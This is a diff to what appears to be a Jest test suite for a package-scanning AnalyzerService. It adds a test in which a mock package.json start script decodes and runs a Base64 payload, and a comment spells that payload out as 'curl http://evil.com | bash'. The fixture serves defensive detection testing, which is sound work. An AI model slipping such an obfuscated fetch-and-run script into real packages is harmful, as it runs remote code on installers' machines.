@@ -37,7 +37,7 @@ describe('AnalyzerService', () => {
         expect(result.packageName).toBe('test-pkg');
         expect(result.vulnerabilities.length).toBeGreaterThan(0);
         const descriptions = result.vulnerabilities.map(v => v.description);
-        expect(descriptions).toContain(expect.stringMatching(/Pipes content directly to bash/));
+        expect(descriptions).toEqual(expect.arrayContaining([expect.stringMatching(/Pipes content directly to bash/)]));
     });
 
     it('should detect suspicious base64 usage', async () => {
@@ -55,9 +55,36 @@ describe('AnalyzerService', () => {
         const result = await analyzer.analyze('package.json');
 
         // Should catch base64 AND | sh
-        const patterns = result.vulnerabilities.map(v => v.description);
-        expect(patterns.some(p => p.includes('Base64'))).toBeTruthy();
-        expect(patterns.some(p => p.includes('Pipes content directly to sh'))).toBeTruthy();
+        const descriptions = result.vulnerabilities.map(v => v.description);
+        // We use arrayContaining to ensure at least these matchers are present
+        expect(descriptions).toEqual(expect.arrayContaining([
+            expect.stringMatching(/Base64 encoding\/decoding/),
+            expect.stringMatching(/Pipes content directly to sh/)
+        ]));
+    });
+
+    it('should recursively decode and detect hidden malware', async () => {
+        // "curl http://evil.com | bash" encoded in Base64 is "Y3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNo"
+        const maliciousPayload = "Y3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNo";
+        const mockPackageJson = JSON.stringify({
+            name: 'hidden-threat',
+            scripts: {
+                start: `echo "${maliciousPayload}" | base64 -d | sh`
+            }
+        });
+
+        (fs.existsSync as jest.Mock).mockReturnValue(true);
+        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
+        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);
+
+        const result = await analyzer.analyze('package.json');
+        const descriptions = result.vulnerabilities.map(v => v.description);
+
+        // It should find the *decoded* payload
+        // It should find the *decoded* payload wrapper message
+        expect(descriptions).toEqual(expect.arrayContaining([
+            expect.stringMatching(/Obfuscated \(Base64\) payload detected/)
+        ]));
     });
 
     it('should be safe with safe scripts', async () => {
